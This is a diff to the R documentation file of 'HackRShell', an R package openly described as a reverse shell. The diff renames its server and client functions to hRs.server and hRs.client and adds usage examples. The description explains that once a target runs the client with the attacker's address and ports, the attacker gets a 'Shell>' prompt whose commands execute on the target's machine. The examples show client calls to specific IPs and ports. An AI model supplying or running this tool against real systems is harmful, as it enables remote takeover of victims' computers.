@@ -3,22 +3,22 @@
 \alias{hackrshell}
 \alias{hackRshell}
 \alias{HackRShell}
-\alias{client}
-\alias{server}
+\alias{hRs.client}
+\alias{hRs.server}
 
 \title{
 HackRShell - the R Reverse Shell
 }
 
 \description{
-This program spawns a reverse shell on a target's computer. The attacker first runs the server() function on their machine, which will start the server listening for connections. Once a target runs the client() function with the corrrect address and port numbers, the target's R session will hang and the attacker should see a connection to their computer with the prompt "Shell>". From there, the attacker can enter commands and they will execute on the target's R session. See the details section for a list of valid commands. Note that commands are case-sensitive.
+This program spawns a reverse shell on a target's computer. The attacker first runs the hRs.server() function on their machine, which will start the server listening for connections. Once a target runs the hRs.client() function with the corrrect address and port numbers, the target's R session will hang and the attacker should see a connection to their computer with the prompt "Shell>". From there, the attacker can enter commands and they will execute on the target's R session. See the details section for a list of valid commands. Note that commands are case-sensitive.
 
 To end the session, the attacker sends the "exit"" command
 }
 \usage{
-server(host, port, secondaryPort)
+hRs.server(host, port, secondaryPort)
 
-client(host, port, secondaryPort)
+hRs.client(host, port, secondaryPort)
 }
 \arguments{
   \item{host}{
@@ -72,11 +72,18 @@ Ian Roberts
 }
 
 \examples{
-client()
 
-client("192.168.0.1", 3343, 4454)
+hRs.server()
 
-client("127.0.0.1")
+hRs.client()
+
+hRs.server("192.168.0.1", 3343, 4454)
+
+hRs.client("192.168.0.1", 3343, 4454)
+
+hRs.server("127.0.0.1")
+
+hRs.client("127.0.0.1")
 }
 \keyword{ IO }
 
